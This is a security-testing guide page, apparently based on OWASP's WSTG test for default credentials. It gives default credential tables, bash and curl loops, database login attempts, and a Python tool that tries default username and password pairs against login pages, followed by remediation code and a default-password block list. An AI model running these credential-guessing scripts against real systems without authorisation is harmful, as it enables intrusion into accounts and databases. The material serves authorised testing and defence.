# WSTG-ATHN-02: Testing for Default Credentials

## Test ID
WSTG-ATHN-02

## Test Name
Testing for Default Credentials

## High-Level Description

Many applications, devices, and services ship with default or well-known credentials that administrators often forget to change. Attackers can easily find these credentials through documentation, online databases, or simple guessing. This test identifies systems using default credentials that could allow unauthorized access.

---

## What to Check

### Default Credential Sources

- [ ] Application default accounts
- [ ] Framework/CMS defaults
- [ ] Database default credentials
- [ ] Admin panel defaults
- [ ] API default tokens
- [ ] Third-party component defaults

### Common Default Credentials

| Application | Username | Password |
|-------------|----------|----------|
| Tomcat | admin, tomcat | admin, tomcat, s3cret |
| Jenkins | admin | admin (or no password) |
| WordPress | admin | admin |
| Joomla | admin | admin |
| MySQL | root | (empty), root, mysql |
| PostgreSQL | postgres | postgres |
| MongoDB | admin | (no auth by default) |
| Redis | - | (no auth by default) |
| Elasticsearch | elastic | changeme |

---

## How to Test

### Step 1: Identify Application/Technology

```bash
# Fingerprint the application
curl -sI "https://target.com" | grep -i "server\|x-powered-by"

# Check common paths for admin panels
paths=(
    "/admin"
    "/administrator"
    "/wp-admin"
    "/manager"
    "/phpmyadmin"
    "/console"
    "/login"
)

for path in "${paths[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
    if [ "$status" != "404" ]; then
        echo "$path: $status"
    fi
done
```

### Step 2: Test Common Default Credentials

```bash
#!/bin/bash
TARGET=$1
LOGIN_ENDPOINT=${2:-"/login"}

# Common default credential pairs
declare -A credentials=(
    ["admin"]="admin password admin123 123456 administrator"
    ["root"]="root toor password 123456"
    ["user"]="user password user123"
    ["test"]="test test123 password"
    ["guest"]="guest guest123"
    ["administrator"]="administrator admin Admin123"
)

echo "Testing default credentials on $TARGET$LOGIN_ENDPOINT"

for username in "${!credentials[@]}"; do
    for password in ${credentials[$username]}; do
        response=$(curl -s -X POST "$TARGET$LOGIN_ENDPOINT" \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"$username\",\"password\":\"$password\"}" \
            -w "\n%{http_code}")

        status=$(echo "$response" | tail -1)
        body=$(echo "$response" | head -n -1)

        # Check for success indicators
        if [ "$status" == "200" ] && ! echo "$body" | grep -qi "invalid\|error\|fail"; then
            echo "[SUCCESS] $username:$password"
        fi
    done
done
```

### Step 3: Test Technology-Specific Defaults

```bash
# Tomcat Manager
curl -u admin:admin "https://target.com/manager/html" -s -o /dev/null -w "%{http_code}"
curl -u tomcat:tomcat "https://target.com/manager/html" -s -o /dev/null -w "%{http_code}"
curl -u admin:s3cret "https://target.com/manager/html" -s -o /dev/null -w "%{http_code}"

# Jenkins
curl -u admin:admin "https://target.com/jenkins/" -s -o /dev/null -w "%{http_code}"

# WordPress
curl -X POST "https://target.com/wp-login.php" \
    -d "log=admin&pwd=admin&wp-submit=Log+In" \
    -s -o /dev/null -w "%{http_code}"

# phpMyAdmin
curl -X POST "https://target.com/phpmyadmin/" \
    -d "pma_username=root&pma_password=&server=1" \
    -s -o /dev/null -w "%{http_code}"
```

### Step 4: Test Database Default Credentials

```bash
# MySQL
mysql -h target.com -u root -p'' -e "SELECT 1" 2>/dev/null && echo "MySQL: root with empty password"
mysql -h target.com -u root -proot -e "SELECT 1" 2>/dev/null && echo "MySQL: root:root"

# PostgreSQL
PGPASSWORD=postgres psql -h target.com -U postgres -c "SELECT 1" 2>/dev/null && echo "PostgreSQL: postgres:postgres"

# MongoDB (no auth)
mongosh "mongodb://target.com:27017" --eval "db.adminCommand('listDatabases')" 2>/dev/null && echo "MongoDB: No auth required"

# Redis (no auth)
redis-cli -h target.com PING 2>/dev/null && echo "Redis: No auth required"
```

### Step 5: Test API Default Tokens

```bash
# Test common API keys/tokens
tokens=(
    "admin"
    "test"
    "api_key"
    "secret"
    "12345"
    "default"
)

for token in "${tokens[@]}"; do
    response=$(curl -s -H "Authorization: Bearer $token" \
        "https://target.com/api/v1/user" \
        -w "\n%{http_code}")

    status=$(echo "$response" | tail -1)
    if [ "$status" == "200" ]; then
        echo "[VULN] API accepts token: $token"
    fi

    # Also try as API key
    response=$(curl -s -H "X-API-Key: $token" \
        "https://target.com/api/v1/user" \
        -w "\n%{http_code}")

    status=$(echo "$response" | tail -1)
    if [ "$status" == "200" ]; then
        echo "[VULN] API accepts X-API-Key: $token"
    fi
done
```

### Step 6: Check for Vendor Default Credentials

```bash
# Use online databases
# https://cirt.net/passwords
# https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials

# Example: Cisco devices
curl -u admin:admin "https://target.com/admin" -s -o /dev/null -w "%{http_code}"
curl -u cisco:cisco "https://target.com/admin" -s -o /dev/null -w "%{http_code}"

# Example: Network devices
curl -u admin:1234 "https://target.com" -s -o /dev/null -w "%{http_code}"
curl -u admin:password "https://target.com" -s -o /dev/null -w "%{http_code}"
```

---

## Tools

### Credential Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Hydra** | Password cracker | `hydra -L users.txt -P pass.txt target http-post` |
| **Medusa** | Parallel brute-forcer | `medusa -h target -U users.txt -P pass.txt -M http` |
| **Ncrack** | Network auth cracker | `ncrack target -U users.txt -P pass.txt` |

### Default Credential Lists

| Resource | Description |
|----------|-------------|
| **SecLists** | Default credentials lists |
| **CIRT.net** | Default password database |
| **DefaultCreds** | Default credential repository |

---

## Example Commands/Payloads

### Default Credential Tester Script

```python
#!/usr/bin/env python3
import requests
import json

class DefaultCredsTester:
    # Comprehensive default credentials database
    DEFAULT_CREDS = {
        "generic": [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", "admin123"),
            ("administrator", "administrator"),
            ("root", "root"),
            ("root", "toor"),
            ("user", "user"),
            ("test", "test"),
            ("guest", "guest"),
        ],
        "tomcat": [
            ("admin", "admin"),
            ("tomcat", "tomcat"),
            ("admin", "s3cret"),
            ("manager", "manager"),
            ("role1", "role1"),
        ],
        "jenkins": [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", ""),
        ],
        "wordpress": [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "wp-admin"),
        ],
        "joomla": [
            ("admin", "admin"),
            ("admin", "password"),
        ],
        "mysql": [
            ("root", ""),
            ("root", "root"),
            ("root", "mysql"),
            ("root", "password"),
        ],
        "postgresql": [
            ("postgres", "postgres"),
            ("postgres", "password"),
        ],
        "mongodb": [
            ("admin", "admin"),
            ("root", "root"),
        ],
    }

    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.results = []

    def test_http_basic(self, path, creds):
        """Test HTTP Basic authentication"""
        for username, password in creds:
            try:
                response = self.session.get(
                    f"{self.target}{path}",
                    auth=(username, password),
                    timeout=10
                )

                if response.status_code == 200:
                    self.results.append({
                        "type": "HTTP Basic",
                        "path": path,
                        "username": username,
                        "password": password,
                        "status": "SUCCESS"
                    })
                    return True

            except requests.exceptions.RequestException:
                pass

        return False

    def test_form_login(self, path, creds, username_field="username", password_field="password"):
        """Test form-based login"""
        for username, password in creds:
            try:
                response = self.session.post(
                    f"{self.target}{path}",
                    data={
                        username_field: username,
                        password_field: password
                    },
                    allow_redirects=False,
                    timeout=10
                )

                # Check for success indicators
                if response.status_code in [200, 302]:
                    # Check if login succeeded
                    if "dashboard" in response.headers.get("Location", "").lower() or \
                       "invalid" not in response.text.lower():
                        self.results.append({
                            "type": "Form Login",
                            "path": path,
                            "username": username,
                            "password": password,
                            "status": "POSSIBLE SUCCESS"
                        })

            except requests.exceptions.RequestException:
                pass

    def test_json_login(self, path, creds):
        """Test JSON API login"""
        for username, password in creds:
            try:
                response = self.session.post(
                    f"{self.target}{path}",
                    json={"username": username, "password": password},
                    timeout=10
                )

                if response.status_code == 200:
                    try:
                        data = response.json()
                        if "token" in data or "success" in data:
                            self.results.append({
                                "type": "API Login",
                                "path": path,
                                "username": username,
                                "password": password,
                                "status": "SUCCESS"
                            })
                    except:
                        pass

            except requests.exceptions.RequestException:
                pass

    def run_tests(self):
        """Run all default credential tests"""
        print(f"Testing default credentials on {self.target}")

        # Test common paths
        paths = {
            "/manager/html": ("tomcat", "HTTP Basic"),
            "/admin": ("generic", "Form"),
            "/login": ("generic", "Form"),
            "/api/login": ("generic", "JSON"),
            "/wp-login.php": ("wordpress", "Form"),
            "/administrator": ("joomla", "Form"),
        }

        for path, (cred_type, auth_type) in paths.items():
            creds = self.DEFAULT_CREDS.get(cred_type, self.DEFAULT_CREDS["generic"])

            print(f"Testing {path} ({auth_type})...")

            if auth_type == "HTTP Basic":
                self.test_http_basic(path, creds)
            elif auth_type == "Form":
                self.test_form_login(path, creds)
            elif auth_type == "JSON":
                self.test_json_login(path, creds)

        return self.results

    def print_results(self):
        """Print test results"""
        print("\n=== DEFAULT CREDENTIALS TEST RESULTS ===\n")

        if self.results:
            print("[!] POTENTIAL VULNERABILITIES FOUND:\n")
            for result in self.results:
                print(f"  Type: {result['type']}")
                print(f"  Path: {result['path']}")
                print(f"  Credentials: {result['username']}:{result['password']}")
                print(f"  Status: {result['status']}")
                print()
        else:
            print("[+] No default credentials found")

# Usage
tester = DefaultCredsTester("https://target.com")
tester.run_tests()
tester.print_results()
```

---

## Remediation Guide

### 1. Force Password Change on First Login

```python
from flask import redirect, url_for, session

@app.before_request
def check_password_change():
    if current_user.is_authenticated:
        if current_user.must_change_password:
            if request.endpoint not in ['change_password', 'logout', 'static']:
                return redirect(url_for('change_password'))

@app.route('/change-password', methods=['GET', 'POST'])
@login_required
def change_password():
    if request.method == 'POST':
        new_password = request.form['new_password']

        # Validate password strength
        if not is_strong_password(new_password):
            flash('Password does not meet requirements')
            return render_template('change_password.html')

        # Check it's not the default password
        if new_password in DEFAULT_PASSWORDS:
            flash('Cannot use a common default password')
            return render_template('change_password.html')

        current_user.set_password(new_password)
        current_user.must_change_password = False
        db.session.commit()

        return redirect(url_for('dashboard'))

    return render_template('change_password.html')
```

### 2. Remove Default Accounts

```sql
-- Remove default accounts from database
DELETE FROM users WHERE username IN ('admin', 'test', 'guest', 'demo');

-- Or disable them
UPDATE users SET active = false WHERE username IN ('admin', 'test', 'guest');
```

### 3. Detect and Block Default Credential Usage

```python
DEFAULT_PASSWORDS = {
    'admin', 'password', '123456', 'admin123',
    'root', 'toor', 'test', 'guest'
}

def check_default_password(password):
    """Check if password is a known default"""
    return password.lower() in DEFAULT_PASSWORDS

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    user = User.query.filter_by(username=username).first()

    if user and user.check_password(password):
        if check_default_password(password):
            # Log security event
            log_security_event('default_password_login', username)

            # Force password change
            session['must_change_password'] = True

        login_user(user)
        return redirect(url_for('dashboard'))

    return 'Invalid credentials', 401
```

### 4. Installation Security Checklist

```markdown
## Post-Installation Security Checklist

1. [ ] Change all default passwords
2. [ ] Remove or disable default accounts
3. [ ] Disable installation/setup pages
4. [ ] Remove default API keys/tokens
5. [ ] Change database default credentials
6. [ ] Update default encryption keys
7. [ ] Review and change default configurations
8. [ ] Remove sample/demo content
9. [ ] Disable debug modes
10. [ ] Enable logging and monitoring
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Admin access with default credentials | 9.8 | Critical |
| Database with default/no password | 9.8 | Critical |
| Application default account active | 8.8 | High |
| Default API key accepted | 8.8 | High |

**Attack Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-1392** | Use of Default Credentials | Default username/password |
| **CWE-798** | Use of Hard-coded Credentials | Embedded credentials |
| **CWE-287** | Improper Authentication | Authentication bypass |

---

## References

- [OWASP WSTG - Testing for Default Credentials](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials)
- [CIRT.net Default Passwords](https://cirt.net/passwords)
- [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)

---

## Checklist

```
[ ] Application technology identified
[ ] Admin panel locations found
[ ] Generic default credentials tested
[ ] Technology-specific defaults tested
[ ] Database default credentials tested
[ ] API default tokens tested
[ ] Third-party component defaults tested
[ ] Vendor documentation reviewed
[ ] Online credential databases checked
[ ] All findings documented
[ ] Remediation recommendations provided
```
